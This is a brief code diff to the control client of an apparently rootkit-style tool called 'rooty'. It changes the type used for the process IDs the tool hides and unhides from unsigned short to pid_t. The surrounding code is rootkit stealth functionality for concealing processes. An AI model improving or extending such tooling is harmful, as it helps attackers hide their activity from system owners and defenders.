@@ -17,7 +17,7 @@
 
 struct rooty_proc_args
 {
-    unsigned short pid;
+    pid_t pid;
 };
 
 struct rooty_port_args
@@ -72,9 +72,9 @@ int main ( int argc, char *argv[] )
 
     case 1:
     {
-        unsigned short pid = (unsigned short)strtoul(argv[2], NULL, 0);
+        pid_t pid = (pid_t)strtol(argv[2], NULL, 0);
 
-        printf("Hiding PID %hu\n", pid);
+        printf("Hiding PID %d\n", pid);
 
         rooty_proc_args.pid = pid;
         rooty_args.cmd = 1;
@@ -86,9 +86,9 @@ int main ( int argc, char *argv[] )
 
     case 2:
     {
-        unsigned short pid = (unsigned short)strtoul(argv[2], NULL, 0);
+        pid_t pid = (pid_t)strtol(argv[2], NULL, 0);
 
-        printf("Unhiding PID %hu\n", pid);
+        printf("Unhiding PID %d\n", pid);
 
         rooty_proc_args.pid = pid;
         rooty_args.cmd = 2;
